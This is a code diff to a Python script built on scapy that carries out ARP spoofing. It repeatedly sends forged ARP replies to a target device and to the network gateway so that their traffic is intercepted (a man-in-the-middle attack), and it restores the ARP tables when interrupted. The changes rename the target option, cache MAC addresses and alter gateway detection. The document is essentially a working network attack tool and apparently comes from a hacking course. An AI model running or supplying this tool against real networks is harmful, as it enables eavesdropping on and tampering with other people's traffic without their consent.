@@ -7,54 +7,60 @@ import optparse
 
 def get_arguments():
     parser = optparse.OptionParser()
-    parser.add_option("-t", "--target", dest="target_ip", help="Target IP")
+    parser.add_option("-d", "--device", dest="device_ip", help="Target IP")
     (options, arguments) = parser.parse_args()
-    if not options.target_ip:
-        parser.error("[-] Specify an Target IP, use --help for more info")
+    if not options.device_ip:
+        parser.error("[-] Specify an Device IP, use --help for more info")
     return options
 
 
 def get_gateway_ip():
-    gateway_ip = re.search(r"\d\d\d.\d\d\d.\d.\d", subprocess.check_output(["route", "-n"]).decode())
-    return gateway_ip.group(0)
+    gateway_ip = re.findall(r"\d+.\d+.\d+.\d+", subprocess.check_output(["route", "-n"]).decode())
+    return gateway_ip[1]
 
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
-    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
+    answered_list = scapy.srp(arp_request_broadcast, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
 
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
+def spoof(target_ip, spoof_ip, target_mac):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
 
-def restore(dest_ip, src_ip):
-    dest_mac = get_mac(dest_ip)
-    src_mac = get_mac(src_ip)
+def restore(dest_ip, src_ip, dest_mac, src_mac):
     packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
     scapy.send(packet, count=4, verbose=False)
 
 
 options = get_arguments()
-target_ip = options.target_ip
+device_ip = options.device_ip
+device_mac = get_mac(device_ip)
+if device_mac:
+    print("[+] Got device mac")
 gateway_ip = get_gateway_ip()
+if gateway_ip:
+    print(f"[+] Gateway IP found: {gateway_ip}")
+gateway_mac = get_mac(gateway_ip)
+if gateway_mac:
+    print("[+] Got Gateway mac")
+
 try:
     sent_packets_count = 0
     while True:
-        spoof(gateway_ip, target_ip)
-        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, device_ip, device_mac)
+        spoof(device_ip, gateway_ip, gateway_mac)
         sent_packets_count += 2
         print(f"\r[+] Packets sent: {sent_packets_count}", end="")
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[+] Detected CTRL + C.......Resetting ARP tables.")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
+    restore(device_ip, gateway_ip, device_mac, gateway_mac)
+    restore(gateway_ip, device_ip, gateway_mac, device_mac)
 
 
 # IP FORWARDING
